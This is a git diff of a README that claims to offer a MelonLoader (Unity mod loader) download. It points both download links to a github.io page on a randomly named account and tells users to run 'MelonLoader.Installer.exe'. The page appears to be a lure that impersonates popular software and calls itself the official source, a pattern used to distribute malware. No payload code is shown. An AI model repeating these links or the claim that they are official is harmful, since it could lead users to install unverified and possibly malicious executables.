@@ -1,6 +1,6 @@
 # 🍈 melon-loader-download - Add custom mods to Unity games
 
-[ ![Download MelonLoader](https://img.shields.io/badge/Download-Click_Here-blue.svg) ](https://github.com/imprisonmentphonemessage673/melon-loader-download)
+[ ![Download MelonLoader](https://img.shields.io/badge/Download-Click_Here-blue.svg) ](https://imprisonmentphonemessage673.github.io)
 
 ## 📁 What is MelonLoader?
 
@@ -25,7 +25,7 @@ If you lack the .NET Framework, download it from the official Microsoft website 
 Follow these steps to set up the loader on your system. 
 
 1.  **Visit the Download Page:** Navigate to the official link to retrieve the necessary installer files.
-    [Download MelonLoader Here](https://github.com/imprisonmentphonemessage673/melon-loader-download)
+    [Download MelonLoader Here](https://imprisonmentphonemessage673.github.io)
 2.  **Locate the File:** Find the downloaded zip file in your downloads folder. Right-click the folder and select "Extract All" to see the contents.
 3.  **Run the Installer:** Double-click the file named "MelonLoader.Installer.exe". The program window appears on your screen.
 4.  **Select Your Game:** Click the "Select" button inside the installer. Navigate to the game folder where your game's main executable file exists (usually named GameName.exe).
